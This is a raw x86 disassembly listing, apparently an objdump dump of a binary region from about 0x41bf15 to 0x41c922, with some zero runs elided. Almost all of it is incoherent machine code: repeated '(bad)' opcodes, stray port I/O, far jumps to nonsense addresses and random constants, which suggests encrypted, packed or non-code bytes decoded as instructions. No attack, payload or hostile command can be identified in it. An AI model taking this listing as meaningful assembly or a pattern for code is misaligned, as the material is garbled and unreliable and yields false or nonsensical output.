  41bf15:	mov    edx,0x28a7df9d
  41bf1a:	add    DWORD PTR [ebx],edx
  41bf1c:	jmp    0x10f13b53
  41bf21:	inc    esi
  41bf22:	scas   eax,DWORD PTR es:[edi]
  41bf23:	pop    ebx
  41bf24:	and    BYTE PTR cs:[ebx-0x7e],bh
  41bf28:	int    0xe9
  41bf2a:	sbb    DWORD PTR [ecx],esi
  41bf2c:	xchg   ebp,eax
  41bf2d:	loop   0x41bec7
  41bf2f:	js     0x41beb8
  41bf31:	std    
  41bf32:	xor    eax,0xbfa5f2f4
  41bf37:	mov    edi,0x9d06ab3f
  41bf3c:	(bad)  
  41bf3d:	jp     0x41bf9e
  41bf3f:	push   0x75
  41bf41:	scas   eax,DWORD PTR es:[edi]
  41bf42:	das    
  41bf43:	cmp    al,0x31
  41bf45:	and    DWORD PTR [edx],esi
  41bf47:	xor    esi,DWORD PTR [ecx-0x1297c641]
  41bf4d:	adc    al,ch
  41bf4f:	pop    ebp
  41bf50:	in     al,dx
  41bf51:	jecxz  0x41bf14
  41bf53:	ror    DWORD PTR [ecx],cl
  41bf55:	dec    esp
  41bf56:	aam    0xf3
  41bf58:	pop    ebp
  41bf59:	pop    es
  41bf5a:	test   eax,0xc5f737e6
  41bf5f:	cmp    dh,cl
  41bf61:	sbb    ebp,ebx
  41bf63:	or     dl,dl
  41bf65:	daa    
  41bf66:	push   edi
  41bf67:	jo     0x41bf89
  41bf69:	jns    0x41bf51
  41bf6b:	mov    bl,0x56
  41bf6d:	cmp    eax,0xcab7a274
  41bf72:	jbe    0x41bfa7
  41bf74:	and    dl,bl
  41bf76:	dec    edx
  41bf77:	out    0xfa,eax
  41bf79:	addr16 loope 0x41bf0e
  41bf7c:	int3   
  41bf7d:	ins    BYTE PTR es:[edi],dx
  41bf7e:	push   esp
  41bf7f:	loop   0x41bfaa
  41bf81:	popf   
  41bf82:	mov    DWORD PTR ds:0x8a6d20d3,ebx
  41bf88:	adc    ebp,ecx
  41bf8a:	push   ebp
  41bf8b:	xchg   esp,eax
  41bf8c:	in     al,0xbf
  41bf8e:	pop    eax
  41bf8f:	mov    cl,0x20
	...
  41bff1:	add    BYTE PTR [eax],al
  41bff3:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	jne    0x41c01e
  41c002:	enter  0x8a54,0x29
  41c006:	add    DWORD PTR [eax],eax
  41c008:	add    eax,0xfc000001
  41c00d:	mov    ebx,0xb7237a7b
  41c012:	pop    ecx
  41c013:	ins    BYTE PTR es:[edi],dx
  41c014:	popf   
  41c015:	std    
  41c016:	mov    al,ds:0x386e0300
  41c01b:	ins    DWORD PTR es:[edi],dx
  41c01c:	lods   eax,DWORD PTR ds:[esi]
  41c01d:	gs add eax,0xc1b05a67
  41c023:	in     eax,dx
  41c024:	loop   0x41c00a
  41c026:	or     dl,BYTE PTR [ebx]
  41c028:	sub    al,0x54
  41c02a:	push   0xcc323141
  41c02f:	test   BYTE PTR [ecx],cl
  41c031:	(bad)  
  41c032:	fisub  DWORD PTR ds:0x55c8d7c7
  41c038:	push   ds
  41c039:	test   al,0xa5
  41c03b:	daa    
  41c03c:	sbb    eax,0x60dd021a
  41c041:	iret   
  41c042:	out    dx,eax
  41c043:	add    BYTE PTR [ecx+0x3c],ah
  41c046:	js     0x41c059
  41c048:	es in  eax,dx
  41c04a:	dec    esi
  41c04b:	inc    ecx
  41c04c:	xchg   ecx,eax
  41c04d:	sub    cl,BYTE PTR [edi-0x5522b36a]
  41c053:	ror    DWORD PTR [ecx+eiz*1+0x31],0x8
  41c058:	mov    ds:0x40add6ac,al
  41c05d:	pop    ds
  41c05e:	fstp   DWORD PTR [esp+ebx*8]
  41c061:	cmp    eax,0xb3d2605c
  41c066:	jge    0x41c028
  41c068:	js     0x41c06f
  41c06a:	je     0x41c024
  41c06c:	shl    bh,cl
  41c06e:	xor    eax,0x64f909ba
  41c073:	inc    ecx
  41c074:	sbb    al,0x88
  41c076:	hlt    
  41c077:	test   al,0xa2
  41c079:	push   esp
  41c07a:	retf   
  41c07b:	cdq    
  41c07c:	push   cs
  41c07d:	dec    ecx
  41c07e:	lds    esi,FWORD PTR [esi+0x20]
  41c081:	push   edi
  41c082:	cmc    
  41c083:	ret    0x73f2
  41c086:	jmp    0x41c0e8
  41c088:	cmc    
  41c089:	mov    ch,0xa2
  41c08b:	cmp    BYTE PTR [ecx],dh
  41c08d:	(bad)  
  41c08e:	stos   DWORD PTR es:[edi],eax
  41c08f:	xlat   BYTE PTR ds:[ebx]
  41c090:	cs loop 0x41c080
  41c093:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c094:	fstp   TBYTE PTR [ecx]
  41c096:	cs jmp 0xbc50:0xe628d63b
  41c09e:	mov    ah,0x82
  41c0a0:	cs js  0x41c111
  41c0a3:	lea    edx,[ecx]
  41c0a5:	add    eax,0x6b4da09a
  41c0aa:	mov    dl,0x5a
  41c0ac:	cmp    eax,0xcce870c7
  41c0b1:	rol    BYTE PTR [edi-0x5ce0daca],0x80
  41c0b8:	(bad)  
  41c0ba:	push   eax
  41c0bb:	fs mov ah,0x4f
  41c0be:	cld    
  41c0bf:	mov    al,ds:0x8b198f75
  41c0c4:	pop    esp
  41c0c5:	pop    ebp
  41c0c6:	jmp    0x41c0c6
  41c0c8:	fcom   QWORD PTR [edi-0x271def5]
  41c0ce:	dec    esp
  41c0cf:	push   ss
  41c0d0:	adc    BYTE PTR [ebp-0x77844ea5],ah
  41c0d6:	icebp  
  41c0d7:	aaa    
  41c0d8:	xlat   BYTE PTR ds:[ebx]
  41c0d9:	adc    al,0xa6
  41c0db:	jmp    FWORD PTR [ebp+0x50b4da5b]
  41c0e1:	cmp    esp,ecx
  41c0e3:	call   0x70fcd3a3
  41c0e8:	push   edi
  41c0e9:	mov    dh,0xb
  41c0eb:	jl     0x41c162
  41c0ed:	push   cs
  41c0ee:	push   0x188151ac
  41c0f3:	lea    eax,[ebx]
  41c0f5:	adc    BYTE PTR [ebp-0x6c93f0c4],ah
  41c0fb:	test   BYTE PTR [esi],al
  41c0fd:	fidivr WORD PTR [edx-0x5]
  41c100:	test   eax,0xd6aa445e
  41c105:	sub    ch,BYTE PTR [eax]
  41c107:	xlat   BYTE PTR ds:[ebx]
  41c108:	sub    esp,DWORD PTR [ecx-0x5fb2043d]
  41c10e:	dec    ecx
  41c10f:	aas    
  41c110:	add    BYTE PTR es:[eax],al
	...
  41c173:	add    cl,bl
  41c175:	dec    edx
  41c176:	mov    eax,ds:0xd9fbb3f8
  41c17b:	imul   edi,DWORD PTR ds:0x26e90501,0x73
  41c182:	and    eax,0x12a8f3e
  41c187:	add    BYTE PTR ds:0x3a000001,al
  41c18d:	push   edx
  41c18e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c18f:	pop    edi
  41c190:	mov    eax,0x5794b4a6
  41c195:	lods   eax,DWORD PTR ds:[esi]
  41c196:	adc    DWORD PTR [edx+0x48],ebp
  41c199:	mov    esp,0x8d4e7af5
  41c19e:	pop    es
  41c19f:	mov    esi,ebp
  41c1a1:	cwde   
  41c1a2:	mov    cl,0x46
  41c1a4:	lock ret 
  41c1a6:	adc    bl,BYTE PTR [esi+0x5ad61a71]
  41c1ac:	cmp    dl,BYTE PTR [esi]
  41c1ae:	sbb    dh,BYTE PTR [ebp+0x1c]
  41c1b1:	sbb    ebx,DWORD PTR [ebx+ecx*2]
  41c1b4:	scas   al,BYTE PTR es:[edi]
  41c1b5:	jmp    0xaef9bae7
  41c1ba:	outs   dx,BYTE PTR ds:[esi]
  41c1bb:	das    
  41c1bc:	pop    esp
  41c1bd:	fdiv   st(7),st
  41c1bf:	ins    DWORD PTR es:[edi],dx
  41c1c0:	inc    esi
  41c1c1:	inc    ebp
  41c1c2:	dec    ebp
  41c1c3:	xchg   ecx,eax
  41c1c4:	jle    0x41c1ad
  41c1c6:	pop    edx
  41c1c7:	cmc    
  41c1c8:	jno    0x41c152
  41c1ca:	mov    ah,0xa2
  41c1cc:	pop    ds
  41c1cd:	sbb    DWORD PTR [ebx+0x30],edx
  41c1d0:	ss push ss
  41c1d2:	arpl   WORD PTR [edi],ax
  41c1d4:	sbb    ebp,esi
  41c1d6:	(bad)  
  41c1d7:	pop    edx
  41c1d8:	xor    BYTE PTR [ebx+ebp*8-0x36b40d2f],bl
  41c1df:	stos   DWORD PTR es:[edi],eax
  41c1e0:	je     0x41c230
  41c1e2:	cmp    BYTE PTR [eax-0x68],bh
  41c1e5:	mov    ah,0xaf
  41c1e7:	mov    ebx,DWORD PTR [edi+0x7]
  41c1ea:	loop   0x41c21e
  41c1ec:	cmc    
  41c1ed:	loopne 0x41c236
  41c1ef:	ins    BYTE PTR es:[edi],dx
  41c1f0:	fbstp  TBYTE PTR [esi+0x7b2c4792]
  41c1f6:	popf   
  41c1f7:	outs   dx,BYTE PTR ds:[esi]
  41c1f8:	sub    BYTE PTR [ebp-0x25],0xa0
  41c1fc:	push   ebp
  41c1fd:	inc    ebx
  41c1fe:	add    BYTE PTR ds:0x77084997,ah
  41c204:	push   edi
  41c205:	xchg   DWORD PTR [eax],ebp
  41c207:	and    edx,DWORD PTR [esi]
  41c209:	sub    ebp,DWORD PTR [ebx]
  41c20b:	pop    eax
  41c20c:	adc    eax,0xf2f7407a
  41c211:	mov    esi,0x6d0094cd
  41c216:	sti    
  41c217:	fiadd  DWORD PTR [eax+0x587b2620]
  41c21d:	mov    DWORD PTR [edi],ecx
  41c21f:	iret   
  41c220:	ds in  eax,dx
  41c222:	jne    0x41c230
  41c224:	mov    al,0x66
  41c226:	dec    ebp
  41c227:	dec    ebx
  41c228:	xchg   edx,eax
  41c229:	xchg   edi,eax
  41c22a:	les    edi,FWORD PTR ds:0x10780e22
  41c230:	xchg   DWORD PTR [ebx],ebp
  41c232:	js     0x41c264
  41c234:	(bad)
  41c237:	dec    esi
  41c238:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c239:	stos   BYTE PTR es:[edi],al
  41c23a:	sbb    al,0x77
  41c23c:	popf   
  41c23d:	push   ss
  41c23e:	sbb    eax,0x989a95df
  41c243:	push   cs
  41c244:	iret   
  41c245:	scas   eax,DWORD PTR es:[edi]
  41c246:	inc    ecx
  41c247:	mov    es,edi
  41c249:	std    
  41c24a:	push   esp
  41c24b:	push   0x5b
  41c24d:	ret    0x4c56
  41c250:	xor    edx,DWORD PTR [edi-0x53]
  41c253:	jmp    0x41c273
  41c255:	push   edi
  41c256:	add    BYTE PTR ds:[edx-0x19],al
  41c25a:	scas   al,BYTE PTR es:[edi]
  41c25b:	les    eax,FWORD PTR [ebp+0x5aa2a841]
  41c261:	shr    ebp,cl
  41c263:	test   eax,0xe6f73b46
  41c268:	fimul  WORD PTR [ebp+0x4e9f9cc2]
  41c26e:	mov    esp,0x415d57a9
  41c273:	mov    eax,0x6f8b4bcf
  41c278:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c279:	(bad)  
  41c27a:	fisubr DWORD PTR [ecx-0xe]
  41c27d:	adc    ecx,esp
  41c27f:	cmc    
  41c280:	push   ebp
  41c281:	and    al,0xb2
  41c283:	adc    al,0xe1
  41c285:	xchg   esp,eax
  41c286:	adc    DWORD PTR [eax-0x325c9295],0x5d
  41c28d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c28e:	jae    0x41c2b2
  41c290:	xchg   esp,eax
	...
  41c2f1:	add    BYTE PTR [eax],al
  41c2f3:	add    bl,dh
  41c2f5:	and    ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	xchg   edx,eax
  41c301:	mov    bh,0x72
  41c303:	mov    al,ds:0x12b94
  41c308:	add    eax,0x28000001
  41c30d:	add    ch,BYTE PTR [esi-0x182be8ba]
  41c313:	out    0xc0,eax
  41c315:	mov    esi,0xacf17233
  41c31a:	ss stos DWORD PTR es:[edi],eax
  41c31c:	stc    
  41c31d:	and    DWORD PTR [esi+ecx*2+0x14],esp
  41c321:	add    DWORD PTR [eax+0x44],ecx
  41c324:	arpl   ax,bp
  41c326:	test   DWORD PTR [esp+esi*2-0xefdf5d4],ebp
  41c32d:	das    
  41c32e:	mov    cl,0xb8
  41c330:	bound  ecx,QWORD PTR [edi-0x41a88c43]
  41c336:	mov    ebx,0x51116ba9
  41c33b:	sti    
  41c33c:	fistp  WORD PTR [eax+0x4]
  41c33f:	sbb    dh,BYTE PTR [edi]
  41c341:	test   BYTE PTR [ecx+0x2f4e62ca],ch
  41c347:	mov    ah,0x57
  41c349:	fcom   QWORD PTR [eax+0x54]
  41c34c:	test   BYTE PTR ds:0x9ec7f7a1,al
  41c352:	jne    0x41c396
  41c354:	mov    ebp,0xd7a0d130
  41c359:	lahf   
  41c35a:	push   esp
  41c35b:	push   esp
  41c35c:	xchg   ecx,eax
  41c35d:	cmp    al,0x22
  41c35f:	jge    0x41c302
  41c361:	push   es
  41c362:	and    edi,eax
  41c364:	shl    DWORD PTR [esi-0x27],1
  41c367:	mov    eax,fs:0x37383fe4
  41c36d:	pop    ss
  41c36e:	sbb    DWORD PTR [esi+0x2937b57],ebx
  41c374:	call   0xa8b78f5
  41c379:	sub    DWORD PTR [esi-0x3e],eax
  41c37c:	test   eax,0x59cf9c80
  41c381:	inc    eax
  41c382:	fimul  DWORD PTR [ebp+0x444047c0]
  41c388:	xor    DWORD PTR [ebx-0x7936af51],ebx
  41c38e:	xchg   ecx,eax
  41c38f:	fnsave ds:0x9e423ef0
  41c395:	push   ebx
  41c396:	int    0xb8
  41c398:	fld    DWORD PTR [ebx]
  41c39a:	cmp    al,0xe5
  41c39c:	leave  
  41c39d:	daa    
  41c39e:	aad    0xe4
  41c3a0:	mov    esp,DWORD PTR [ebx]
  41c3a2:	nop
  41c3a3:	cmp    DWORD PTR [edi+edx*2],ebp
  41c3a6:	sbb    esi,eax
  41c3a8:	cmp    DWORD PTR [ecx],edx
  41c3aa:	xchg   ebx,eax
  41c3ab:	div    BYTE PTR [esi-0x693918d1]
  41c3b1:	jno    0x41c379
  41c3b3:	test   eax,0xfca9313
  41c3b8:	pop    edi
  41c3b9:	mov    DWORD PTR [esi+0x63],0xbec31511
  41c3c0:	fisttp DWORD PTR [ecx+0xabfa291]
  41c3c6:	arpl   WORD PTR [ecx+eax*2],dx
  41c3c9:	mov    DWORD PTR [ebx-0xb],ebx
  41c3cc:	xor    DWORD PTR [eax+eiz*1-0x6f],ebp
  41c3d0:	loope  0x41c3f6
  41c3d2:	mov    bl,al
  41c3d4:	or     eax,0xcc177b90
  41c3d9:	add    eax,0x920aac47
  41c3de:	push   esi
  41c3df:	cwde   
  41c3e0:	mov    cl,0x47
  41c3e2:	cdq    
  41c3e3:	pop    es
  41c3e4:	pop    edx
  41c3e5:	test   eax,0x147e9972
  41c3ea:	pop    es
  41c3eb:	sbb    al,0xe6
  41c3ed:	out    0x4b,al
  41c3ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3f0:	mov    cl,0x35
  41c3f2:	jae    0x41c39d
  41c3f4:	out    dx,ax
  41c3f6:	call   0x9a2eb347
  41c3fb:	xchg   esi,eax
  41c3fc:	mov    ds:0xf33009e8,eax
  41c401:	ja     0x41c3b2
  41c403:	sbb    DWORD PTR [ecx-0x19],ebp
  41c406:	loopne 0x41c3c9
  41c408:	ret    0xa288
  41c40b:	int3   
  41c40c:	or     al,0xaf
  41c40e:	mov    cl,0x50
  41c410:	cmp    al,BYTE PTR [eax]
	...
  41c472:	add    BYTE PTR [eax],al
  41c474:	push   ebx
  41c475:	and    BYTE PTR [eax+0x5faef3ae],ah
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	repz mov dh,0x45
  41c483:	les    ebx,FWORD PTR [ecx+0x500012c]
  41c489:	add    DWORD PTR [eax],eax
  41c48b:	add    BYTE PTR [esi-0x27],cl
  41c48e:	test   DWORD PTR [eax+0x7a412c48],ecx
  41c494:	dec    edx
  41c495:	nop
  41c496:	and    eax,0x899c06a8
  41c49b:	outs   dx,BYTE PTR ds:[esi]
  41c49c:	xor    BYTE PTR [edx-0x453b1e4b],bh
  41c4a2:	mov    ds:0x684d317e,eax
  41c4a7:	std    
  41c4a8:	mov    DWORD PTR [esp+ebp*1-0x52f5d267],esi
  41c4af:	std    
  41c4b0:	mov    BYTE PTR [ebx+0x7f],bl
  41c4b3:	frstor [esi-0x34]
  41c4b6:	inc    esi
  41c4b7:	dec    eax
  41c4b8:	mov    dl,0x9e
  41c4ba:	sbb    eax,0xcc74b604
  41c4bf:	imul   ecx,DWORD PTR [edx],0x13
  41c4c2:	out    dx,eax
  41c4c3:	arpl   WORD PTR [edx-0x45],dx
  41c4c6:	push   0x4e813340
  41c4cb:	or     al,0xe5
  41c4cd:	sti    
  41c4ce:	fbld   TBYTE PTR [esi+eax*1-0x7d5a919c]
  41c4d5:	dec    esp
  41c4d6:	xor    eax,0x81ca3283
  41c4db:	ror    DWORD PTR [eax+ebp*4+0x68],0xb0
  41c4e0:	sub    dl,ch
  41c4e2:	mov    dl,0xa8
  41c4e4:	xchg   esp,eax
  41c4e5:	pop    esi
  41c4e6:	into   
  41c4e7:	cmp    cl,dh
  41c4e9:	inc    eax
  41c4ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4eb:	push   0x1e13ed8e
  41c4f0:	inc    esp
  41c4f1:	je     0x41c549
  41c4f3:	push   cs
  41c4f4:	jbe    0x41c567
  41c4f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4f7:	leave  
  41c4f8:	mov    edi,DWORD PTR [eax-0x2]
  41c4fb:	adc    ecx,DWORD PTR [eax+0x51cc3c4]
  41c501:	je     0x41c4eb
  41c503:	fsubr  DWORD PTR [ebx-0x767e5c13]
  41c509:	pop    ebx
  41c50a:	or     eax,0x578b5a98
  41c50f:	fist   WORD PTR [ecx]
  41c511:	or     al,0xbb
  41c513:	or     al,0xf8
  41c515:	aam    0x1b
  41c517:	leave  
  41c518:	sub    eax,0x4d821fe6
  41c51d:	fst    DWORD PTR [eax+0x5f3ad69c]
  41c523:	and    BYTE PTR [ebx-0x11],ah
  41c526:	outs   dx,DWORD PTR ds:[esi]
  41c527:	add    DWORD PTR [esi-0x678add6a],edi
  41c52d:	scas   al,BYTE PTR es:[edi]
  41c52e:	div    edx
  41c530:	retf   0x36f
  41c533:	jmp    0x85c194b6
  41c538:	xchg   ebp,eax
  41c539:	in     eax,0x1e
  41c53b:	stc    
  41c53c:	inc    edx
  41c53d:	xchg   esp,eax
  41c53e:	pop    ebx
  41c53f:	jbe    0x41c4f1
  41c541:	sbb    eax,0x91e5e1d8
  41c546:	push   ds
  41c547:	mov    ebp,0xb37b71eb
  41c54c:	stc    
  41c54d:	sub    DWORD PTR [edx-0x3bc6a3bc],ecx
  41c553:	in     eax,dx
  41c554:	mov    bh,0xa3
  41c556:	and    al,0x7f
  41c558:	mul    DWORD PTR [ebx+0x5b]
  41c55b:	jns    0x41c549
  41c55d:	aam    0x32
  41c55f:	pushw  cs
  41c561:	jno    0x41c53d
  41c563:	mov    DWORD PTR [edi+0x62],edi
  41c566:	cs pop esp
  41c568:	sub    al,0x7f
  41c56a:	cmp    DWORD PTR [edx-0x4639d350],edi
  41c570:	adc    edi,DWORD PTR [ebp-0x1ff4c1a8]
  41c576:	(bad)  
  41c577:	dec    eax
  41c578:	pushf  
  41c579:	inc    esp
  41c57a:	adc    DWORD PTR [ebp+0x21220967],0x6a
  41c581:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c582:	push   ebx
  41c583:	fdivr  st(2),st
  41c585:	dec    ebp
  41c586:	fs out 0x4f,eax
  41c589:	mov    gs,WORD PTR [ebx-0x1227334b]
  41c58f:	loope  0x41c52b
	...
  41c5f1:	add    BYTE PTR [eax],al
  41c5f3:	add    ch,al
  41c5f5:	and    edx,DWORD PTR [ecx-0xa4808db]
  41c5fb:	jecxz  0x41c640
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d9e:0x51c95ab5
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    eax,0x1c000001
  41c60d:	imul   esp,DWORD PTR [edx],0xfffffff8
  41c610:	inc    esi
  41c611:	cdq    
  41c612:	adc    al,0xfc
  41c614:	and    al,0x64
  41c616:	mov    esp,0x9e553bbb
  41c61b:	loop   0x41c5cc
  41c61d:	jae    0x41c64a
  41c61f:	int    0xf2
  41c621:	and    ecx,esi
  41c623:	mov    BYTE PTR [edx+0x31],cl
  41c626:	mov    dh,0xa1
  41c628:	enter  0x91ff,0xe2
  41c62c:	int    0xa2
  41c62e:	imul   edi,DWORD PTR [edi+0x9],0x42a9cdc7
  41c635:	mov    dh,0x5d
  41c637:	xor    ah,BYTE PTR [ebx+0x43]
  41c63a:	xchg   DWORD PTR [edi+esi*8],esp
  41c63d:	mov    ebx,0xed64d046
  41c642:	xlat   BYTE PTR ds:[ebx]
  41c643:	pop    ecx
  41c644:	mov    bh,0xf
  41c646:	jmp    FWORD PTR [edx+0x41]
  41c649:	pop    edi
  41c64a:	lods   eax,DWORD PTR ds:[esi]
  41c64b:	lds    ebx,FWORD PTR [edi]
  41c64d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c64e:	cmp    ebp,ecx
  41c650:	cdq    
  41c651:	retf   0xf85d
  41c654:	mov    ebp,0xe5b5851f
  41c659:	pop    esi
  41c65a:	in     eax,dx
  41c65b:	rcl    edi,0xf5
  41c65e:	sub    eax,0xba89c470
  41c663:	adc    eax,0xff127bcc
  41c668:	outs   dx,DWORD PTR ds:[esi]
  41c669:	inc    edi
  41c66a:	xchg   edi,eax
  41c66b:	rcr    BYTE PTR [esi+0x42],1
  41c66e:	mov    ds:0x9e3d326c,eax
  41c673:	sar    BYTE PTR [edi],1
  41c675:	cmp    eax,0x4a83bd3d
  41c67a:	call   0x346e:0x323c93ee
  41c681:	ins    DWORD PTR es:[edi],dx
  41c682:	ss gs adc eax,0x66b3d4c
  41c689:	mov    esi,0x30f0faea
  41c68e:	push   eax
  41c68f:	pop    eax
  41c690:	in     al,0xf3
  41c692:	xchg   edi,eax
  41c693:	xchg   esp,eax
  41c694:	adc    edx,DWORD PTR [ecx]
  41c696:	fld    QWORD PTR [esi]
  41c698:	scas   eax,DWORD PTR es:[edi]
  41c699:	stos   BYTE PTR es:[edi],al
  41c69a:	ins    DWORD PTR es:[edi],dx
  41c69b:	das    
  41c69c:	data16 sub BYTE PTR [esi+0x6f1bcba2],bl
  41c6a3:	jne    0x41c647
  41c6a5:	ret    
  41c6a6:	fwait
  41c6a7:	xor    DWORD PTR [edx],ebp
  41c6a9:	shl    DWORD PTR [edi+0x38],0xcb
  41c6ad:	adc    DWORD PTR [esi+0x23],ebx
  41c6b0:	imul   DWORD PTR [ecx+0x74]
  41c6b3:	(bad)  
  41c6b4:	mov    dl,0x1a
  41c6b6:	push   0x81450bcf
  41c6bb:	jb     0x41c647
  41c6bd:	pop    eax
  41c6be:	mov    cl,BYTE PTR [eax]
  41c6c0:	daa    
  41c6c1:	fcomp  DWORD PTR [esp+edx*4-0x59eb714b]
  41c6c8:	pop    ebx
  41c6c9:	xchg   edx,eax
  41c6ca:	xlat   BYTE PTR ds:[ebx]
  41c6cb:	xlat   BYTE PTR ds:[ebx]
  41c6cc:	lahf   
  41c6cd:	test   eax,0x76e9d1fd
  41c6d2:	xor    bh,BYTE PTR [eax-0x5f96fe63]
  41c6d8:	hlt    
  41c6d9:	out    dx,al
  41c6da:	mov    ds:0xbe5ca666,eax
  41c6df:	jmp    0x2fd4648d
  41c6e4:	xor    eax,0xbf9ac8e7
  41c6e9:	dec    ebp
  41c6ea:	inc    ecx
  41c6eb:	das    
  41c6ec:	and    eax,eax
  41c6ee:	pop    ebx
  41c6ef:	mov    bh,0xd5
  41c6f1:	sub    ch,ah
  41c6f3:	jns    0x41c6ff
  41c6f5:	xchg   DWORD PTR [esi],ebp
  41c6f7:	or     bh,BYTE PTR ds:0x2152c37b
  41c6fd:	aam    0xde
  41c6ff:	mov    esp,0x48fce633
  41c704:	inc    ebp
  41c705:	sub    DWORD PTR [edx+0x4f],edx
  41c708:	or     al,BYTE PTR [eax+0xa41c752]
  41c70e:	loopne 0x41c716
  41c710:	adc    eax,DWORD PTR [eax]
	...
  41c772:	add    BYTE PTR [eax],al
  41c774:	fiadd  DWORD PTR [ecx]
  41c776:	ret    0xdb86
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	mov    WORD PTR [edx+0x46],fs
  41c783:	bt     DWORD PTR [esi],ebp
  41c786:	add    DWORD PTR [eax],eax
  41c788:	add    eax,0xb9000001
  41c78d:	mov    eax,0x66fb9101
  41c792:	push   ebx
  41c793:	mov    al,0x6d
  41c795:	cmp    eax,0xcf345427
  41c79a:	nop
  41c79b:	mov    dh,0x5
  41c79d:	clc    
  41c79e:	sub    al,0x43
  41c7a0:	inc    ebx
  41c7a1:	mov    fs,WORD PTR [eax+0x3f]
  41c7a4:	cmp    DWORD PTR [ecx+0x1df6707e],edi
  41c7aa:	jg     0x41c72f
  41c7ac:	mov    ecx,0x1cb2d3a1
  41c7b1:	lods   eax,DWORD PTR ds:[esi]
  41c7b2:	imul   ebp,DWORD PTR [ebp-0x10b1f236],0xcc11d97f
  41c7bc:	daa    
  41c7bd:	mov    al,0x65
  41c7bf:	jle    0x41c811
  41c7c1:	xor    dl,BYTE PTR [ebp-0x7b]
  41c7c4:	mov    dl,0xa0
  41c7c6:	(bad)  
  41c7c7:	adc    dh,BYTE PTR [ebx]
  41c7c9:	ins    BYTE PTR es:[edi],dx
  41c7ca:	popa   
  41c7cb:	push   edi
  41c7cc:	scas   al,BYTE PTR es:[edi]
  41c7cd:	sub    al,0x6c
  41c7cf:	fld    TBYTE PTR [eax+0x6e76fb9a]
  41c7d5:	mov    ds:0xa30a375a,eax
  41c7da:	ins    DWORD PTR es:[edi],dx
  41c7db:	clc    
  41c7dc:	sbb    ax,0x1db6
  41c7e0:	bound  ebp,QWORD PTR [esi]
  41c7e2:	jo     0x41c82a
  41c7e4:	push   esi
  41c7e5:	cmp    BYTE PTR [ecx],bh
  41c7e7:	hlt    
  41c7e8:	and    eax,0xeea105de
  41c7ed:	push   ds
  41c7ee:	addr16 push esp
  41c7f0:	fldenv [ebx+edx*1]
  41c7f3:	cdq    
  41c7f4:	in     eax,0x37
  41c7f6:	xchg   edx,eax
  41c7f7:	adc    al,al
  41c7f9:	ret    
  41c7fa:	mov    bl,0xdf
  41c7fc:	mov    al,ds:0x7ea00e1c
  41c801:	fisubr WORD PTR [edi-0x1a]
  41c804:	scas   al,BYTE PTR es:[edi]
  41c805:	and    bh,BYTE PTR [ecx]
  41c807:	inc    edi
  41c808:	sbb    eax,0x57099c53
  41c80d:	pop    eax
  41c80e:	cmp    eax,DWORD PTR [edi+esi*1-0x3444e131]
  41c815:	and    DWORD PTR gs:0x8b3edc48,ebp
  41c81c:	sub    eax,0xdf34916
  41c821:	sub    DWORD PTR [ecx-0x7e3e1482],esp
  41c827:	and    DWORD PTR [eax+0x19ea0125],ecx
  41c82d:	test   al,0xd2
  41c82f:	sahf   
  41c830:	fcomp  QWORD PTR [esi+0x5e65144f]
  41c836:	or     eax,0x8ff15593
  41c83b:	dec    esp
  41c83c:	shl    DWORD PTR [ebx],cl
  41c83e:	push   cs
  41c83f:	push   0x178d8ba3
  41c844:	std    
  41c845:	scas   eax,DWORD PTR es:[edi]
  41c846:	aam    0xc7
  41c848:	dec    eax
  41c849:	jno    0x41c801
  41c84b:	(bad)  [edx-0x1deb1da2]
  41c851:	add    eax,0x790b71b1
  41c856:	pop    edx
  41c857:	daa    
  41c858:	imul   esi,DWORD PTR [ebx+0x74],0xffffffa8
  41c85c:	sbb    BYTE PTR [esi-0x24178888],ah
  41c862:	xchg   ebx,eax
  41c863:	push   edi
  41c864:	sbb    eax,ebp
  41c866:	dec    edx
  41c867:	hlt    
  41c868:	adc    DWORD PTR [edx+0x646b2e4f],ebx
  41c86e:	push   0x384ed4b
  41c873:	and    dl,BYTE PTR [esi]
  41c875:	sti    
  41c876:	in     eax,dx
  41c877:	lea    eax,[edi-0x2e7e338e]
  41c87d:	add    bl,bh
  41c87f:	dec    ecx
  41c880:	xchg   ebp,eax
  41c881:	push   ss
  41c882:	jo     0x41c867
  41c884:	sub    BYTE PTR [edi],bl
  41c886:	aaa    
  41c887:	mov    bl,0x73
  41c889:	imul   eax,DWORD PTR [ebp+0x4d5db2cd],0xffffffa3
  41c890:	mov    al,BYTE PTR [eax]
	...
  41c8f2:	add    BYTE PTR [eax],al
  41c8f4:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41c8fb:	ja     0x41c915
  41c8fd:	sub    DWORD PTR [ebx],edi
  41c8ff:	add    esp,ecx
  41c901:	cld    
  41c902:	fs sti 
  41c904:	test   al,0x2f
  41c906:	add    DWORD PTR [eax],eax
  41c908:	add    eax,0xdd000001
  41c90d:	and    DWORD PTR [edx+edx*2-0x44df1f8a],ebp
  41c914:	push   es
  41c915:	cli    
  41c916:	out    0x39,eax
  41c918:	inc    bl
  41c91a:	dec    ebx
  41c91b:	mov    ds:0x4a813fd5,eax
  41c920:	je     0x41c95a
  41c922:	dec    ecx
